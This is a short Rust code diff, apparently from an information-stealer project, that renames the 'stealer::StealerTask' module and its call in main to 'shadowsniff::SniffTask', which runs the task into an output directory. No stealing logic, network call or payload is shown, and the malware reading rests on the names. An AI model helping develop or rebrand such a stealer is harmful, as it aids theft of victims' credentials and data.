@@ -15,7 +15,7 @@
 
 extern crate alloc;
 
-use stealer::StealerTask;
+use shadowsniff::SniffTask;
 use tasks::Task;
 use utils::path::Path;
 
@@ -32,7 +32,7 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
     let _ = out.mkdir();
 
     unsafe {
-        StealerTask::new().run(&out);
+        SniffTask::new().run(&out);
     }
 
     0
